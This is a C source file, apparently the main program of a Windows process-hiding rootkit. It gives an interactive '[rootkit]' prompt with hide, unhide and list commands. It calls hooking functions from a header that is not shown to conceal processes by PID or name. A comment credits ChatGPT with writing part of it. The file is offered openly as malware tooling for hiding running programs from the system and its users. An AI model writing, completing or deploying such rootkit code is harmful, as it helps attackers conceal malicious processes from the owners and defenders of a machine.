#define _CRT_SECURE_NO_WARNINGS

#include "proc_hide.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// credits to chatgpt for this bit lmao, yet again got too lazy
void print_help(void) {
    printf("\n=== Rootkit ===\n");
    printf("Commands:\n");
    printf("  hide <PID|name>     - Hide process by PID or name\n");
    printf("  unhide <PID|name>   - Unhide process by PID or name\n");
    printf("  list                - List all processes\n");
    printf("  help                - Show this help\n");
    printf("  exit                - Exit the program\n");
    printf("\nExamples:\n");
    printf("  hide notepad.exe\n");
    printf("  hide 1234\n");
    printf("  unhide notepad.exe\n");
    printf("  unhide 1234\n");
}

// the rest here is all on me
int is_number(const char* str) {
    while (*str) {
        if (!isdigit(*str)) return 0;
        str++;
    }
    return 1;
}

void cleanup(void) {
    remove_hooks();
    hidden_process_t* current = hidden_list;
    while (current) {
        hidden_process_t* next = current->next;
        free(current);
        current = next;
    }
}

int main(void) {
    char command[256];
    char arg[256];
    printf("[rootkit] activated\n");
    printf("[rootkit] type 'help' for commands\n\n");
    install_hooks();
    atexit(cleanup);
    while (1) {
        printf("[rootkit]~$ ");
        fflush(stdout);
        if (fgets(command, sizeof(command), stdin) == NULL) {
            break;
        }
        command[strcspn(command, "\n")] = 0;
        if (strlen(command) == 0) continue;
        if (strcmp(command, "exit") == 0) {
            printf("[rootkit] exiting...\n");
            break;
        }
        else if (strcmp(command, "help") == 0) {
            print_help();
        }
        else if (strcmp(command, "list") == 0) {
            list_processes();
        }
        else if (sscanf(command, "hide %255s", arg) == 1) {
            if (is_number(arg)) {
                hide_process_by_pid(atoi(arg));
            }
            else {
                hide_process_by_name(arg);
            }
        }
        else if (sscanf(command, "unhide %255s", arg) == 1) {
            if (is_number(arg)) {
                unhide_process_by_pid(atoi(arg));
            }
            else {
                unhide_process_by_name(arg);
            }
        }
        else {
            printf("[rootkit] unknown command: %s\n", command);
            printf("[rootkit] type 'help' for available commands\n");
        }
    }
    return 0;
}
